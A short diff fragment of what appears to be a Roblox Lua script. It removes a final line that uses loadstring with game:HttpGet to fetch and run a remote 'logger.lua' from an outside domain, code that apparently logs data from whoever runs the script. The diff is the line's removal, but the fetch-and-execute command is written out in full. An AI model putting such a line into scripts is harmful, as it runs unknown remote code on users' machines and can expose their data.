@@ -2996,5 +2996,3 @@ print([[
 ]])
 
 print("Copyright (C) 2026 hellohellohell012321")
-
-loadstring(game:HttpGet("https://hellohellohell0.com/talentless-raw/logger.lua", true))()
